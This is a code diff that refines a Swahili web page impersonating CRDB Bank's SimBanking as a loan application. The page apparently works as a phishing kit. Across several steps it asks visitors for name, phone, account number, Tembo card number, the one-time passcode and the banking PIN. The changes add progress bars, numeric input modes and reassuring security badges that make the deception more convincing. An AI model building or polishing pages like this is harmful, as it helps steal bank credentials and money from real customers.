@@ -12,7 +12,8 @@
         <header class="bank-header">
             <div class="menu-icon">☰</div>
             <div class="brand-logo">
-                <span class="crdb-text">CRDB</span> <span class="bank-text">BANK</span>
+                <span class="crdb-text">CRDB</span>
+                <span class="bank-text">BANK</span>
                 <span class="divider">|</span>
                 <div class="simbanking-logo">
                     <span class="phone-icon">📱</span>
@@ -58,11 +59,11 @@
 
                 <div class="monthly-payment-box">
                     <span>Malipo ya Kila Mwezi</span>
-                    <strong id="monthlyPaymentDisplay">TSh 9,504</strong>
+                    <strong id="monthlyPaymentDisplay">TSh 9,456</strong>
                 </div>
             </div>
 
-            <div class="form-group" style="margin-top: 15px;">
+            <div class="form-group">
                 <label>Jina la Kwanza & Jina la Ukoa</label>
                 <div class="name-grid">
                     <input type="text" id="firstName" placeholder="Jina la kwanza">
@@ -74,14 +75,32 @@
                 <label>Namba ya Simu</label>
                 <div class="phone-input-wrapper">
                     <span class="prefix">+255</span>
-                    <input type="tel" id="phoneNumber" placeholder="712345678">
+                    <input type="tel" id="phoneNumber" inputmode="numeric" placeholder="712345678">
                 </div>
             </div>
 
             <button class="btn-primary" onclick="submitPersonalInfo()">OMBA SASA</button>
+
+            <div class="features-footer">
+                <div class="feature-item">
+                    <span class="f-icon">⚡</span>
+                    <strong>Idhini ya Haraka</strong>
+                    <span>Ndani ya masaa 24</span>
+                </div>
+                <div class="feature-item">
+                    <span class="f-icon">💰</span>
+                    <strong>Riba Nafuu</strong>
+                    <span>Kuanzia 25%</span>
+                </div>
+                <div class="feature-item">
+                    <span class="f-icon">🔒</span>
+                    <strong>Salama</strong>
+                    <span>Kiwango cha benki</span>
+                </div>
+            </div>
         </div>
 
-        <!-- STEP 3: Tembo Card & Account Verification -->
+        <!-- STEP 2: Tembo Card & Account Verification -->
         <div id="step-step3" class="form-step">
             <div class="progress-bar-container"><div class="progress-fill" style="width: 33%;"></div></div>
             <h2 class="section-title">Unatumia Uthibitishaji wa Kadi ya Tembo</h2>
@@ -89,19 +108,20 @@
 
             <div class="form-group">
                 <label>Ingiza nambari yako ya akaunti</label>
-                <input type="text" id="accountNumber" placeholder="Namba ya akaunti">
+                <input type="text" id="accountNumber" inputmode="numeric" placeholder="Namba ya akaunti">
             </div>
 
             <div class="form-group">
                 <label>Ingiza nambari yako ya kadi</label>
-                <input type="text" id="cardNumber" placeholder="1111-1111-1111-1111">
+                <input type="text" id="cardNumber" inputmode="numeric" placeholder="1111-1111-1111-1111">
             </div>
 
             <button class="btn-primary" onclick="submitTemboCard()">ENDELEA</button>
         </div>
 
-        <!-- STEP 4: OTP Screen with 30s Timer -->
+        <!-- STEP 3: OTP Screen with Timer -->
         <div id="step-step4" class="form-step">
+            <div class="progress-bar-container"><div class="progress-fill" style="width: 66%;"></div></div>
             <div class="shield-badge">🛡️</div>
             <h2 class="section-title">Thibitisha Akaunti Yako</h2>
             <p class="section-desc">Tafadhali ingiza namba ya OTP ya tarakimu 5 iliyotumwa kwa namba yako ya Tembo.</p>
@@ -109,11 +129,11 @@
             <div class="otp-phone-display">📞 OTP imetumwa kwa: <span id="displayPhone"></span></div>
 
             <div class="otp-inputs">
-                <input type="text" maxlength="1" class="otp-box" oninput="moveToNext(this, 1)">
-                <input type="text" maxlength="1" class="otp-box" oninput="moveToNext(this, 2)">
-                <input type="text" maxlength="1" class="otp-box" oninput="moveToNext(this, 3)">
-                <input type="text" maxlength="1" class="otp-box" oninput="moveToNext(this, 4)">
-                <input type="text" maxlength="1" class="otp-box" oninput="moveToNext(this, 5)">
+                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" oninput="moveToNext(this, 1)">
+                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" oninput="moveToNext(this, 2)">
+                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" oninput="moveToNext(this, 3)">
+                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" oninput="moveToNext(this, 4)">
+                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" oninput="moveToNext(this, 5)">
             </div>
 
             <button class="btn-primary" onclick="submitOtp()">Thibitisha Akaunti</button>
@@ -124,17 +144,18 @@
             </div>
         </div>
 
-        <!-- STEP 5: SimBanking PIN -->
+        <!-- STEP 4: SimBanking PIN -->
         <div id="step-step5" class="form-step">
+            <div class="progress-bar-container"><div class="progress-fill" style="width: 100%;"></div></div>
             <div class="lock-badge">🔒</div>
             <h2 class="section-title">Ingiza PIN ya Usalama</h2>
             <p class="section-desc">Ingiza namba ya siri (PIN) ya usalama ya Simbanking ili kuendelea.</p>
 
             <div class="pin-inputs">
-                <input type="password" maxlength="1" class="pin-box" oninput="movePinNext(this, 1)">
-                <input type="password" maxlength="1" class="pin-box" oninput="movePinNext(this, 2)">
-                <input type="password" maxlength="1" class="pin-box" oninput="movePinNext(this, 3)">
-                <input type="password" maxlength="1" class="pin-box" oninput="movePinNext(this, 4)">
+                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box" oninput="movePinNext(this, 1)">
+                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box" oninput="movePinNext(this, 2)">
+                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box" oninput="movePinNext(this, 3)">
+                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box" oninput="movePinNext(this, 4)">
             </div>
 
             <button class="btn-primary" onclick="submitPin()">ENDELEA</button>
